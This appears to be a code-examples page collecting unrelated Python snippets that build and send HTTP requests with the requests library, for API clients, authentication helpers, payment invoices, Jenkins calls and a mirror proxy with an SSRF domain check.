        # time.sleep(3)     # I assume this is in order not to overload the server. Should be done better.

        return res 
**************************************
def __request(self, endpoint, payload=None):
        url = self.api_base + "/" + endpoint
        request = requests.Request("GET", url, params=payload)
        prepared = request.prepare()

        response = self.session.send(prepared)
        if response.status_code != requests.codes.ok:
            raise OXRStatusError(request, response)
        json = response.json()
        if json is None:
            raise OXRDecodeError(request, response)
        return json 
**************************************
def get_request_vars(self):
        """ Returns the variables required by `request()` and other functions.

          :return: (headers, logger, request_object, response, service)
          :rtype: (dict, logging.Logger, requests.Request|None, list|dict|None, string)
        """
        return (
            self.get_headers(),
            logging.getLogger('sfdc_py'),
            None,
            None,
            self.get_request_url()
        ) 
**************************************
def request(self):
        """ Makes request to Salesforce and returns serialised response. Catches any exceptions and appends them to
        `self.exceptions`.

          :return: response: Salesforce response, if available
          :rtype: list|dict|None
        """
        (headers, logger, request_object, response, service) = self.get_request_vars()
        logging.getLogger('sfdc_py').info('%s %s' %
                                          (self.http_method, service))

        if self.http_method == 'POST':
            request_fn = post_request
        elif self.http_method == 'PUT':
            request_fn = put_request
        elif self.http_method == 'PATCH':
            request_fn = patch_request
        elif self.http_method == 'DELETE':
            request_fn = delete_request
        else:
            request_fn = get_request

        try:
            request_object = request_fn(self)
            self.status = request_object.status_code

            if request_object.content.decode('utf-8') == 'null':
                raise SFDCRequestException('Request body is null')
            else:
                response = request_object.json()
        except Exception as e:
            self.exceptions.append(e)
            logger.error('%s %s %s' % (self.http_method, service, self.status))
            logger.error(e.message)
            return
        finally:
            return response 
**************************************
def __init__(self):
        super(self.__class__, self).__init__(input=ConnectionSchema())
        self.session = Session()
        self.request = Request() 
**************************************
def job_bulid_log(self,url,jobname):
        id=self.servir.get_job_info(jobname)['lastCompletedBuild']['number']
        url1=url+str(id)+"/console"
        log=self.servir.jenkins_request(requests.Request('GET',url1)).text
        return log 
**************************************
def _normal_get(self, method, url, params=None, output=None):
        s = self._session
        if self.api_key is not None:
            params['key'] = self.api_key
        if method == 'POST':
            req = requests.Request(method=method, url=url, data=params)
        else:
            req = requests.Request(method=method, url=url, params=params)
        if output:
            req.headers['Accept'] = output
        prep = req.prepare()
        if self._verbose: print(self._safe_url(prep.url))
        try:
            resp = s.send(prep)
            self.__last_url = resp.url
        except requests.exceptions.ConnectionError as e:
            host_port = prep.url.split(prep.path_url)[0]
            raise ConnectionError(f'Could not connect to {host_port}. '
                                  'Are SciGraph services running?') from e
        if resp.status_code == 401:
            raise ConnectionError(f'{resp.reason}. '
                                  f'Did you set {self.__class__.__name__}.api_key'
                                  ' = my_api_key?')
        elif not resp.ok:
            return None
        elif resp.headers['content-type'] == 'application/json':
            return resp.json()
        elif resp.headers['content-type'].startswith('text/plain'):
            return resp.text
        else:
            return resp 
**************************************
def _normal_get(self, method, url, params=None, output=None):
        s = self._session
        if self.api_key is not None:
            params['key'] = self.api_key
        if method == 'POST':
            req = requests.Request(method=method, url=url, data=params)
        else:
            req = requests.Request(method=method, url=url, params=params)
        if output:
            req.headers['Accept'] = output
        prep = req.prepare()
        if self._verbose: print(self._safe_url(prep.url))
        try:
            resp = s.send(prep)
            self.__last_url = resp.url
        except requests.exceptions.ConnectionError as e:
            host_port = prep.url.split(prep.path_url)[0]
            raise ConnectionError(f'Could not connect to {host_port}. '
                                  'Are SciGraph services running?') from e
        if resp.status_code == 401:
            raise ConnectionError(f'{resp.reason}. '
                                  f'Did you set {self.__class__.__name__}.api_key'
                                  ' = my_api_key?')
        elif not resp.ok:
            return None
        elif resp.headers['content-type'] == 'application/json':
            return resp.json()
        elif resp.headers['content-type'].startswith('text/plain'):
            return resp.text
        else:
            return resp 
**************************************
def __call__(self, req: Request) -> Request:
        # Do nothing by default
        return req 
**************************************
def __call__(self, req: Request) -> Request:
        # Add bearer authorization header.
        req.headers['Authorization'] = "Bearer {b}".format(b=self.bearer)
        return req 
**************************************
def _make_request(server, endpoint, data):
    """
    Fires a POST with json-packed data to the given endpoint and returns
    response.

    Parameters:
        endpoint - An `str` object with the endpoint, e.g. "authenticate"
        data - A `dict` containing the payload data.

    Returns:
        A `requests.Request` object.
    """
    res = requests.post(server + "/" + endpoint, data=json.dumps(data),
                        headers=HEADERS)
    return res 
**************************************
def _raise_from_response(res):
    """
    Raises an appropriate `YggdrasilError` based on the `status_code` and
    `json` of a `requests.Request` object.
    """
    if res.status_code == requests.codes['ok']:
        return None

    exception = YggdrasilError()
    exception.status_code = res.status_code

    try:
        json_resp = res.json()
        if not ("error" in json_resp and "errorMessage" in json_resp):
            raise ValueError
    except ValueError:
        message = "[{status_code}] Malformed error message: '{response_text}'"
        message = message.format(status_code=str(res.status_code),
                                 response_text=res.text)
        exception.args = (message,)
    else:
        message = "[{status_code}] {error}: '{error_message}'"
        message = message.format(status_code=str(res.status_code),
                                 error=json_resp["error"],
                                 error_message=json_resp["errorMessage"])
        exception.args = (message,)
        exception.yggdrasil_error = json_resp["error"]
        exception.yggdrasil_message = json_resp["errorMessage"]
        exception.yggdrasil_cause = json_resp.get("cause")

    raise exception 
**************************************
def get_authorize_url(self, redirect_url, scopes):

        params = self.get_authorize_params(
            redirect_url=redirect_url,
            scopes=scopes,
        )

        req = requests.Request(url=self.authorize_url, params=params)
        return req.prepare().url 
**************************************
def test_auth_with_request_on_the_same_host():
    auth = Auth("https://python-poetry.org", "foo", "bar")

    request = Request("GET", "https://python-poetry.org/docs/")
    assert "Authorization" not in request.headers

    request = auth(request)

    assert "Authorization" in request.headers
    assert request.headers["Authorization"] == "Basic {}".format(
        decode(base64.b64encode(encode(":".join(("foo", "bar")))))
    ) 
**************************************
def test_auth_with_request_with_same_authentication():
    auth = Auth("https://python-poetry.org", "foo", "bar")

    request = Request("GET", "https://foo:[email protected]/docs/")
    assert "Authorization" not in request.headers

    request = auth(request)

    assert "Authorization" in request.headers
    assert request.headers["Authorization"] == "Basic {}".format(
        decode(base64.b64encode(encode(":".join(("foo", "bar")))))
    ) 
**************************************
def test_auth_with_request_on_different_hosts():
    auth = Auth("https://python-poetry.org", "foo", "bar")

    request = Request("GET", "https://pendulum.eustace.io/docs/")
    assert "Authorization" not in request.headers

    request = auth(request)

    assert "Authorization" not in request.headers 
**************************************
def __call__(self, r):  # type: (Request) -> Request
        if urlparse.urlparse(r.url).hostname != self._hostname:
            return r

        self._auth(r)

        return r 
**************************************
def test_auth_token_arg(self):
        """Test: 'dcos-auth-token' arg."""
        token = "eyJhbGciOiJIUzI1NiIsImtpZCI6InNlY3JldCIsInR5cCI6IkpXVCJ9.eyJ \
        hdWQiOiIzeUY1VE9TemRsSTQ1UTF4c3B4emVvR0JlOWZOeG05bSIsImVtYWlsIjoiZHNz \
        dHN0YXBsZXRvbnJvYm90aWNzQGdtYWlsLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlL \
        CJleHAiOjEuNDgwODgyMzM5ZSswOSwiaWF0IjoxLjQ4MDQ1MDMzOWUrMDksImlzcyI6Im \
        h0dHBzOi8vZGNvcy5hdXRoMC5jb20vIiwic3ViIjoiZ29vZ2xlLW9hdXRoMnwxMDYyMDA \
        4NzM2MDg4NzgwNDU5MzEiLCJ1aWQiOiJkc3N0c3RhcGxldG9ucm9ib3RpY3NAZ21haWwu \
        Y29tIn0.iq2rKcCH5_rPEd5td-fM2rxlHjIyGAJOmxTd5lceHAU"

        sys.argv[0:] = self._args_app_name + self._args_mandatory + \
            ['--dcos-auth-token', token]
        args = ctlr.parse_args(version_data)
        self.assertEqual(args.dcos_auth_token, token)

        url = 'http://dcos.com/acs/api/v1/auth/login'
        req = requests.Request('POST', url)
        auth_request = req.prepare()
        auth_request.prepare_headers({'Authorization': ''})

        auth = DCOSAuth(args.dcos_auth_credentials, args.marathon_ca_cert,
                        args.dcos_auth_token)

        auth(auth_request)
        self.assertEqual(auth_request.headers['Authorization'],
                         'token=' + token)

        # test via env var
        env_token = 'It will now be a different value'
        sys.argv[0:] = self._args_app_name + self._args_mandatory
        os.environ['F5_CC_DCOS_AUTH_TOKEN'] = env_token
        args = ctlr.parse_args(version_data)
        self.assertEqual(args.dcos_auth_token, env_token) 
**************************************
def upload(self, filename, configuration=None, metadata=None, transcript=None):
        """
        Upload new new media to the service as an attachment or from a url.
        HTTP POST on /media
        :param filename: Media file attached to the request.
        :param configuration: VoicebaseMediaConfiguration
        :param metadata: VoicebaseMediaMeta
        :param transcript: attached transcript
        :return: VoicebaseMedia
        """
        data = {}
        if metadata:
            data['metadata'] = str(metadata)
        if configuration:
            data['configuration'] = str(configuration)

        # Determine mime type
        m = magic.Magic(mime=True)
        mime_type = m.from_file(filename)

        # Open file and pipe to request
        with open(filename) as handle:
            file_info = [('media', (filename, handle, mime_type))]
            rq = requests.Request(b'POST', self.full_url('base'), data=data, headers=self.session.headers,
                                  files=file_info)
            prepared_rq = rq.prepare()
            response = self.session.send(prepared_rq)
            response.raise_for_status()
        jsn = response.json()
        log.debug('Upload response: {}'.format(jsn))
        return VoicebaseMedia(jsn, api=self.api) 
**************************************
def _build_request(self, now):
        params = {'output_format': 'csv/splunk'}
        headers = {'X-RFToken': self.token}
        r = requests.Request(
            'GET',
            'https://api.recordedfuture.com/v2/ip/risklist',
            headers=headers, params=params,

        )

        return r.prepare() 
**************************************
def _build_request(self, now):
        params = {'output_format': 'csv/splunk'}
        headers = {'X-RFToken': self.token}
        r = requests.Request(
            'GET',
            'https://api.recordedfuture.com/v2/domain/risklist',
            headers=headers, params=params,

        )

        return r.prepare() 
**************************************
def _build_request(self, now):
        r = requests.Request(
            'GET',
            self.url
        )

        return r.prepare() 
**************************************
def _build_request(self, now):
        r = requests.Request(
            'GET',
            AZUREXML_URL
        )

        return r.prepare() 
**************************************
def _build_request(self, now):
        r = requests.Request(
            'GET',
            AZUREJSON_URL
        )

        return r.prepare() 
**************************************
def create_invoice(order, callback_url):
    data = {
        'version': 1,
        'key': PUBLIC_KEY,
        'cmd': 'create_transaction',
        'amount': order['item']['price'].decimal_repr(),
        'currency1': order['item']['price'].currency.code,
        'currency2': 'LTCT',
        'buyer_email': order['customer']['email'],
        'buyer_name': f'{order["customer"]["first_name"]} {order["customer"]["last_name"]}',
        'item_name': order['item']['name'],
        'item_number': order['item']['code'],
        'ipn_url': callback_url
    }
    prepped_request = requests.Request('POST', API_ENDPOINT, data=data).prepare()
    signature = hmac.digest(PRIVATE_KEY.encode(), prepped_request.body.encode(), 'sha512').hex()
    prepped_request.headers['HMAC'] = signature
    with requests.Session() as session:
        response = session.send(prepped_request)

    if response.status_code is not 200:
        return None

    response_data = response.json()
    if response_data['error'] != 'ok':
        return None
    
    invoice = {
        'id': response_data['result']['txn_id'],
        'status': 0,
        'status_text': 'new',
        'amount': response_data['result']['amount'],
        'address': response_data['result']['address'],
        'url': response_data['result']['status_url'],
        'qrcode_url': response_data['result']['qrcode_url'],
    }
    db.create_invoice(invoice)
    return invoice 
**************************************
def get_response(self, method, url, data=None, params=None):
        reqt = Request(method, url, data=data, params=params, headers=self.headers)
        prepped = self.ses.prepare_request(reqt)
        resp = self.ses.send(prepped, stream=False)
        return resp 
**************************************
def test_sign_request(self):
        signing_key = authenticationutils.load_signing_key('./test_key_container.p12', "Password1")
        consumer_key = 'dummy'
        uri = "https://sandbox.api.mastercard.com/fraud/merchant/v1/termination-inquiry?Format=XML&PageOffset=0"
        
        request = Request()
        request.method = "POST"
        request.data = ""
            
        signer = OAuthSigner(consumer_key, signing_key)
        request = signer.sign_request(uri, request)
        authHeader = request.headers['Authorization'];
        self.assertTrue("OAuth" in authHeader)
        self.assertTrue("dummy" in authHeader) 
**************************************
def _send_session_request(
            self, method, url, *, verify, proxies=None, **kwargs):
        request = requests.Request(method.upper(), url, **kwargs)
        prepped = self._session.prepare_request(request)
        return self._session.send(
            prepped, allow_redirects=False, verify=verify,
            proxies=proxies or self._proxies,
            timeout=self._socket_timeout()) 
**************************************
def send(self, method, path, headers={}, **kwargs):
        request = requests.Request(method,
                                   self.url(path),
                                   headers=self._headers(headers),
                                   **kwargs)
        return self.session.send(request.prepare()) 
**************************************
def send(self, method, path, headers={}, **kwargs):
        if self.is_cloud:
            # OAuth Path
            request = requests.Request(method,
                                       self.url(path),
                                       headers=self._headers(headers),
                                       **kwargs)
        else:
            # Basic Auth Path
            request = requests.Request(method,
                                       self.url(path),
                                       auth=self.auth,
                                       headers=self._headers(headers),
                                       **kwargs)
        return self.session.send(request.prepare()) 
**************************************
def request(url, params=None):

    params = params or {}
    hapikey = CONFIG['hapikey']
    if hapikey is None:
        if CONFIG['token_expires'] is None or CONFIG['token_expires'] < datetime.datetime.utcnow():
            acquire_access_token_from_refresh_token()
        headers = {'Authorization': 'Bearer {}'.format(CONFIG['access_token'])}
    else:
        params['hapikey'] = hapikey
        headers = {}

    if 'user_agent' in CONFIG:
        headers['User-Agent'] = CONFIG['user_agent']

    req = requests.Request('GET', url, params=params, headers=headers).prepare()
    LOGGER.info("GET %s", req.url)
    with metrics.http_request_timer(parse_source_from_url(url)) as timer:
        resp = SESSION.send(req)
        timer.tags[metrics.Tag.http_status_code] = resp.status_code
        if resp.status_code == 403:
            raise SourceUnavailableException(resp.content)
        else:
            resp.raise_for_status()

    return resp
# {"bookmarks" : {"contacts" : { "lastmodifieddate" : "2001-01-01"
#                                "offset" : {"vidOffset": 1234
#                                           "timeOffset": "3434434 }}
#                 "users" : { "timestamp" : "2001-01-01"}}
#  "currently_syncing" : "contacts"
# }
# }

#pylint: disable=line-too-long 
**************************************
def processReq(self, req, i):
        """处理请求"""
        method, path, callback, params, postdict, reqid = req
        url = REST_HOST + path
        expires = int(time() + 5)

        rq = requests.Request(url=url, data=postdict)
        p = rq.prepare()

        header = copy(self.header)
        header['api-expires'] = str(expires)
        header['api-key'] = self.apiKey
        header['api-signature'] = self.generateSignature(method, path, expires, params, body=p.body)

        # 使用长连接的session，比短连接的耗时缩短80%
        session = self.sessionDict[i]
        resp = session.request(method, url, headers=header, params=params, data=postdict)

        # resp = requests.request(method, url, headers=header, params=params, data=postdict)
        code = resp.status_code
        d = resp.json()
        if code == 200:
            callback(d, reqid)
        else:
            self.onError(code, d)

            # ---------------------------------------------------------------------- 
**************************************
def send_request(method, resource, data=None, headers=None):
    """
    Sends a request to Hopsworks. In case of Unauthorized response, submit the request once more as jwt might not
    have been read properly from local container.
    Args:
        method: HTTP(S) method
        resource: Hopsworks resource
        data: HTTP(S) payload
        headers: HTTP(S) headers
        verify: Whether to verify the https request
    Returns:
        HTTP(S) response
    """
    if headers is None:
        headers = {}
    global verify
    host, port = _get_host_port_pair()
    if verify is None:
        verify = get_requests_verify(host, port)
    set_auth_header(headers)
    url = _get_hopsworks_rest_endpoint() + resource
    req = requests.Request(method, url, data=data, headers=headers)
    prepped = session.prepare_request(req)

    response = session.send(prepped, verify=verify)

    if response.status_code == constants.HTTP_CONFIG.HTTP_UNAUTHORIZED:
        set_auth_header(headers)
        prepped = session.prepare_request(req)
        response = session.send(prepped)
    return response 
**************************************
def authenticate(self, req: Request):
        """Adds CP4D authentication information to the request.

        The CP4D bearer token will be added to the request's headers in the form:

            Authorization: Bearer <bearer-token>

        Args:
            req:  The request to add CP4D authentication information too. Must contain a key to a dictionary
            called headers.
        """
        headers = req.get('headers')
        bearer_token = self.token_manager.get_token()
        headers['Authorization'] = 'Bearer {0}'.format(bearer_token) 
**************************************
def authenticate(self, req: Request):
        """Adds IAM authentication information to the request.

        The IAM bearer token will be added to the request's headers in the form:

            Authorization: Bearer <bearer-token>

        Args:
            req: The request to add IAM authentication information too. Must contain a key to a dictionary
            called headers.
        """
        headers = req.get('headers')
        bearer_token = self.token_manager.get_token()
        headers['Authorization'] = 'Bearer {0}'.format(bearer_token) 
**************************************
def authenticate(self, req: Request):
        """Add basic authentication information to a request.

        Basic Authorization will be added to the request's headers in the form:

            Authorization: Basic <encoded username and password>

        Args:
            req: The request to add basic auth information too. Must contain a key to a dictionary
            called headers.
        """
        headers = req.get('headers')
        headers['Authorization'] = self.authorization_header 
**************************************
def authenticate(self, req: Request):
        """Adds bearer authentication information to the request.

        The bearer token will be added to the request's headers in the form:

            Authorization: Bearer <bearer-token>

        Args:
            req: The request to add bearer authentication information too. Must contain a key to a dictionary
            called headers.
        """
        headers = req.get('headers')
        headers['Authorization'] = 'Bearer {0}'.format(self.bearer_token) 
**************************************
def get_holdings(self,account=None, verbose=False):
        """Create pie graph PNG of the current account holdings.
        Currently does not correctly format negative USD Cash
        """
        
        # Imply account
        if account == None:
            account = self.params['account']
        account = int(account)
        
        # Assemble URL
        url = self.endpoints['base'] +\
              'accounts/'            +\
              str(account)           +\
              '/holdings.json'
        
        # Create auth
        session = requests.Session()
        auth    = self.create_auth()
        req     = requests.Request('GET',url,auth=auth).prepare()
        
        # Send Request
        self.holdings = session.send(req).json()\
            ['response']['accountholdings']
        
        # Get accounts (necessary?)
        if self.accounts == []:
            self.get_accounts()
            
        return self.holdings
    
    ############################################################################ 
**************************************
def account_history(self, account=None, type='all', range="all"):
        """type must be in "all, bookkeeping, trade"
        range must be in "all, today, current_week, current_month, last_month"
        """
        
        if not (utils.check(type) and utils.check(range)):
            return {}
        
        # Imply account
        if account == None:
            account = self.params['account']
            
        # Assemble URL
        url =   self.endpoints['base']    +\
                'accounts/'               +\
                str(account)              +\
                '/history.json'
        # Add parameters
        data = {
            'range':range,
            'transactions':type
        }
        
        # Create HTTP Request objects
        session = requests.Session()
        auth    = self.create_auth()
        req     = requests.Request('GET',url,params=data,auth=auth).prepare()
        
        
        results            = {'response':session.send(req).json()}
        results['request'] = utils.pretty_print_POST(req)
        
        return results['response']['response']['transactions']['transaction']
    ############################################################################ 
**************************************
def options_chain(self, symbol="", direction="c", within_pct=4.0, exp_date=""):
        """Return options with a strike price within a certain percentage of the 
        last price on the market, on a given exp_date, with a specified direction.
        """
        
        # Safety first!
        if not utils.check(symbol) or not utils.check(direction) or not utils.check(exp_date):
            return []
        
        cur_price = self.get_quote(symbol, 'last')['last']
        
        # Format
        direction = "call" if "c" in direction else "put"
        symbol    = symbol.upper()
        fmt_query = "xdate-eq:" + str(exp_date) + \
            " AND " + "strikeprice-gte:" + str(float(cur_price)*(1.0-within_pct/100.0)) + \
            " AND " + "strikeprice-lte:" + str(float(cur_price)*(1.0+within_pct/100.0)) + \
            " AND " + "put_call-eq:" + direction
        
        # Assemble URL
        url =   self.endpoints['base']    + 'market/options/search.json'
        data = {
            'symbol':symbol,
            'query':fmt_query
        }
        
        # Create HTTP Request objects
        auth               = self.create_auth()
        results            = requests.post(url,params=data,auth=auth).json()\
            ['response']['quotes']['quote']
        
        for op in results:
            if direction == "call":
                op['in_the_money'] = op['strikeprice'] <= cur_price
            else:
                op['in_the_money'] = op['strikeprice'] >= cur_price
        return results 
**************************************
def get_request(cls, url=None, data=None, params=None):
        if not data:
            data = {}
        if not params:
            params = {}
        if not url:
            new_url = cls.url
        else:
            new_url = "%s%s" % (cls.url, url)

        return requests.Request(method=cls.method, url=new_url, data=data, params=params, headers=cls.headers, auth=cls.auth) 
**************************************
def toggle_logkeep(self, project, number):
        folder_url, short_name = self.jenkins._get_job_folder(project)
        response = self.jenkins.jenkins_request(requests.Request(
            'POST', self.jenkins._build_url(TOGGLE_LOGKEEP_BUILD, locals())
        ))

        if 200 <= response.status_code < 300:
            return "Successfully set LogKeep flag."
        else:
            return "Failed to toggle logkeep. " \
                   "Respose headers: {}, Response Body: {}".format(response.headers,
                                                                   response.content) 
**************************************
def test_basic_building(self):
        req = requests.Request()
        req.url = 'http://kennethreitz.org/'
        req.data = {'life': '42'}

        pr = req.prepare()
        assert pr.url == req.url
        assert pr.body == 'life=42' 
**************************************
def send_request(url, method='GET', headers=None, param_get=None, data=None):
    """实际发送请求到目标服务器, 对于重定向, 原样返回给用户
    被request_remote_site_and_parse()调用"""
    final_hostname = urlsplit(url).netloc
    dbgprint('FinalRequestUrl', url, 'FinalHostname', final_hostname)
    # Only external in-zone domains are allowed (SSRF check layer 2)
    if final_hostname not in allowed_domains_set and not developer_temporary_disable_ssrf_prevention:
        raise ConnectionAbortedError('Trying to access an OUT-OF-ZONE domain(SSRF Layer 2):', final_hostname)

    # set zero data to None instead of b''
    if not data:
        data = None

    prepped_req = requests.Request(
        method,
        url,
        headers=headers,
        params=param_get,
        data=data,
    ).prepare()

    # get session
    if enable_connection_keep_alive:
        _session = connection_pool.get_session(final_hostname)
    else:
        _session = requests.Session()

    # Send real requests
    parse.time["req_start_time"] = time()
    r = _session.send(
        prepped_req,
        proxies=requests_proxies,
        allow_redirects=False,
        stream=enable_stream_content_transfer,
        verify=not developer_do_not_verify_ssl,
    )
    # remote request time
    parse.time["req_time_header"] = time() - parse.time["req_start_time"]
    dbgprint('RequestTime:', parse.time["req_time_header"], v=4)

    # Some debug output
    # print(r.request.headers, r.headers)
    if verbose_level >= 3:
        dbgprint(r.request.method, "FinalSentToRemoteRequestUrl:", r.url, "\nRem Resp Stat: ", r.status_code)
        dbgprint("RemoteRequestHeaders: ", r.request.headers)
        if data:
            dbgprint('RemoteRequestRawData: ', r.request.body)
        dbgprint("RemoteResponseHeaders: ", r.headers)

    return r 
**************************************
def rewrite_client_request():
    """
    在这里的所有重写都只作用程序内部, 对请求者不可见
    与 prior_request_redirect() 的外部301/307重定向不同,
    本函数通过改变程序内部变量来起到重定向作用
    返回True表示进行了重定向, 需要重载某些设置, 返回False表示未重定向
    遇到重写后, 不会跳出本函数, 而是会继续下一项. 所以重写顺序很重要
    """
    has_been_rewrited = False

    # ------------- 请求重写代码开始 ----------------
    if cdn_redirect_encode_query_str_into_url:
        real_url = extract_real_url_from_embedded_url(request.url)
        if real_url is not None:
            dbgprint("BeforeEmbeddedExtract:", request.url, " After:", real_url)
            request.url = real_url
            request.path = urlsplit(real_url).path
            has_been_rewrited = True

    if url_custom_redirect_enable and shadow_url_redirect_regex:
        _path_query = extract_url_path_and_query()
        _path_query_raw = _path_query

        for before, after in shadow_url_redirect_regex:
            _path_query = re.sub(before, after, _path_query)
            if _path_query != _path_query_raw:
                dbgprint('ShadowUrlRedirect:', _path_query_raw, 'to', _path_query)
                request.url = myurl_prefix + _path_query
                request.path = urlsplit(_path_query).path
                has_been_rewrited = True
                break
    # ------------- 请求重写代码结束 ----------------

    # 如果进行了重写, 那么 has_been_rewrited 为 True
    # 在 rewrite_client_request() 函数内部会更改 request.url
    # 所以此时需要重新解析一遍
    if has_been_rewrited:
        assemble_parse()

    return has_been_rewrited


# ################# End Middle Functions #################

# ################# Begin Flask After Request ################ 
**************************************
def send_to_kannel( msg = {}, preferred_kannel_server = None):
    '''sends a given messages to the _RIGHT_ kannel server'''
    server = None
    if preferred_kannel_server is not None:
        try:
            server = KANNEL_SERVERS[preferred_kannel_server.lower()] #locate using ip
        except KeyError as ke:
            server = KANNEL_SERVERS['DEFAULT_KANNEL_SERVER']
    else: #no preferred server was given, select the proper one based on the recipient number
    
        for s,s_info in KANNEL_SERVERS.items():
            prefixes = s_info['series']
            logger.debug("Server %s supports all numbers with the prefixes %s", s, prefixes)
            for p in prefixes:
                recipient = msg['to'].strip('+')
                logger.debug("Trying to match %s with prefix %s ", recipient, p)
                if recipient.startswith(p): #this is our number series
                    server = s_info 
                    logger.debug("Selected server %s with prefix (%s) matching with recipient number %s", server, prefixes,recipient)
                    break;

            if server is not None: #we have found our server!
                break;

    if server is None:
        logger.error("Could not select any server for forwarding message! Check logs.")
        return (False, 500, '')

    try:
        #compose the complete Request with URL and data for sending sms
        session = Session()

        request = session.prepare_request(compose_request_for_kannel(msg, server))
        logger.debug("Calling %s with data %s", request.url, request.body)
        response = session.send(request)

        print response.status_code
        print response.text
        logger.debug("Received response code %s with text %s", response.status_code, response.text)
        logger.debug("Result is %s %s ", response.status_code, response.text)
        exc_info = sys.exc_info()

        return (True, response.status_code, response.text)
    except requests.ConnectionError as ce:
        exc_info = sys.exc_info()
        logger.critical("Problem while connecting to the server!")
        logger.exception(ce)

        return (False, response.status_code, response.text)
    finally:
        exc_info = sys.exc_info()
        traceback.print_exception(*exc_info)
        del exc_info 
**************************************
def request(self, method, url, authenticated=True, json=None, headers=None, data=None, **kwargs):
        if self.debug:
            print("{} {}".format(method, url))
            if json is not None:
                print(json)

        session = requests.Session()
        request = requests.Request(method, url, json=json, headers=headers,
                data=data, **kwargs)

        # If data is a file or file-like stream, then every time we read from it,
        # the read pointer moves to the end, and we will need to reset it if we are
        # to read again.
        try:
            pos = data.tell()
        except AttributeError:
            pos = None

        # Non-authenticated calls (e.g. to register an account) can bypass the
        # token provider logic.
        if not authenticated:
            prepped = session.prepare_request(request)
            res = session.send(prepped)
            try:
                return res.json()
            except:
                return None

        for provider in self.token_providers:
            if not provider.is_applicable():
                continue

            token = provider.get_token()
            session.headers.update({'Authorization': 'Bearer {}'.format(token)})
            prepped = session.prepare_request(request)

            # Reset the read pointer if the body comes from a file.
            if pos is not None:
                prepped.body.seek(pos)

            try:
                res = session.send(prepped)
            except requests.exceptions.ConnectionError as error:
                raise self.connection_error_type(error.message, error.request,
                        self.authority)

            if res.status_code in self.api_spec['auth_failure_codes']:
                # The status code indicates an authorization failure.  That
                # could mean the token is expired, the password is incorrect,
                # etc.
                provider.update(token, False)
            else:
                provider.update(token, True)
                if res.status_code == 204:
                    return None
                else:
                    try:
                        return res.json()
                    except ValueError:
                        return {"message": res.content} 
**************************************
def pdserver_request(method, url, json=None, headers=None):
    """
    Issue a Paradrop controller API request.

    This will prompt for a username and password if necessary.
    """
    session = requests.Session()

    # Extract just the hostname from the controller URL.  This will be the
    # authentication domain.
    parts = urlparse(PDSERVER_URL)

    config = PdtoolsConfig.load()
    token = config.getAccessToken(parts.netloc)

    while True:
        while token is None:
            username, password = LoginGatherer.prompt(parts.netloc)
            data = {
                'email': username,
                'password': password
            }

            auth_url = '{}/auth/local'.format(PDSERVER_URL)
            request = requests.Request('POST', auth_url, json=data, headers=headers)
            prepped = session.prepare_request(request)
            res = session.send(prepped)
            print("Server responded: {} {}".format(res.status_code, res.reason))

            try:
                res_data = res.json()
                token = res_data['token']

                config.addAccessToken(parts.netloc, username, token)
                config.save()
            except:
                pass

        session.headers.update({'Authorization': 'Bearer {}'.format(token)})
        request = requests.Request(method, url, json=json, headers=headers)
        prepped = session.prepare_request(request)

        res = session.send(prepped)
        print("Server responded: {} {}".format(res.status_code, res.reason))
        if res.status_code == 401:
            # Token is probably expired.
            config.removeAccessToken(token)
            config.save()
            token = None
            continue
        else:
            return res 
**************************************
def _call_api(self, method, endpoint, params=None, data=None, json=None, action_name=None, custom_error=None):

        url = self._base_url + endpoint

        req = Request(
            url=url,
            method=method,
            params=params,
            data=data,
            json=json,
            headers=self.session.headers
        )
        # Build request

        try:
            # Prep request
            req = req.prepare()
            resp = self.session.send(req, verify=self.verify)
            # Check for custom errors
            if custom_error and resp.status_code not in range(200, 299):
                raise Exception(
                    f"An error was received when running {action_name}."
                    f"Request status code of {resp.status_code} was returned."
                    f"{custom_error.get(resp.status_code, 000)}"
                )
            elif resp.status_code == 405:
                raise Exception(
                    f"An error was received when running {action_name}."
                    f"Request status code of {resp.status_code} was returned."
                    "Please make sure connections have been configured correctly")
            elif resp.status_code != 200:
                raise Exception(
                    f"An error was received when running {action_name}."
                    f" Request status code of {resp.status_code} was returned."
                    " Please make sure connections have been configured correctly "
                    f"as well as the correct input for the action. Response was: {resp.text}")

        except Exception as e:
            self.logger.error(f"An error had occurred : {e}"
                              "If the issue persists please contact support")
            raise

        try:
            results = resp.json()
            return results
        except JSONDecodeError:
            raise Exception(
                f"Error: Received an unexpected response from {action_name}"
                f"(non-JSON or no response was received). Response was: {resp.text}") 
**************************************
def send(self, request: requests.Request, **kwargs) -> DetailedResponse:
        """Send a request and wrap the response in a DetailedResponse or APIException.

        Args:
            request: The request to send to the service endpoint.

        Raises:
            ApiException: The exception from the API.

        Returns:
            The response from the request.
        """
        # Use a one minute timeout when our caller doesn't give a timeout.
        # http://docs.python-requests.org/en/master/user/quickstart/#timeouts
        kwargs = dict({"timeout": 60}, **kwargs)
        kwargs = dict(kwargs, **self.http_config)

        if self.disable_ssl_verification:
            kwargs['verify'] = False

        try:
            response = requests.request(**request, cookies=self.jar, **kwargs)

            if 200 <= response.status_code <= 299:
                if response.status_code == 204 or request['method'] == 'HEAD':
                    # There is no body content for a HEAD request or a 204 response
                    result = None
                elif not response.text:
                    result = None
                else:
                    try:
                        result = response.json()
                    except:
                        result = response
                return DetailedResponse(result, response.headers,
                                        response.status_code)

            error_message = None
            if response.status_code == 401:
                error_message = 'Unauthorized: Access is denied due to ' \
                                'invalid credentials'
            raise ApiException(
                response.status_code, error_message, http_response=response)
        except requests.exceptions.SSLError:
            logging.exception(self.ERROR_MSG_DISABLE_SSL)
            raise
        except ApiException as err:
            logging.exception(err.message)
            raise
        except:
            logging.exception('Error in service call')
            raise 
**************************************
def submit_order (self, order, preview=True, account = None, verbose=False):
        """Given an order object, use preview to toggle whether order is submitted or not.
        Also, can specify account, and optional verbosity
        """

        # utils.check input
        if order == None:
            return {}
        
        # Imply account
        if account == None:
            account = self.params['account']
            
        # Must insert account info
        order['Order']['Acct'] = str(int(account))
            
            # Assemble URL
        url = self.endpoints['base']          +\
              'accounts/'                     +\
              str(account)                    +\
              '/orders'                       +\
              ('/preview' if preview else '') +\
             '.json'
        
        # Create FIXML formatted request body
        data = fixml.FIXML(order)
        print(data)
        
        # Create Authentication headers
        auth = self.create_auth()
        
        # Create HTTP request objects
        session = requests.Session()
        req     = requests.Request('POST',url, data=data, auth=auth).prepare()
        
        # Submit request to put order in as soon as possible
        results            = {'response':session.send(req)}
        results['request'] = utils.pretty_print_POST(req)
        
        # Optionally print request
        if verbose:
            print(results['request'])
        
        return results
    ############################################################################ 

Python requests.RequestException() Examples

**************************************
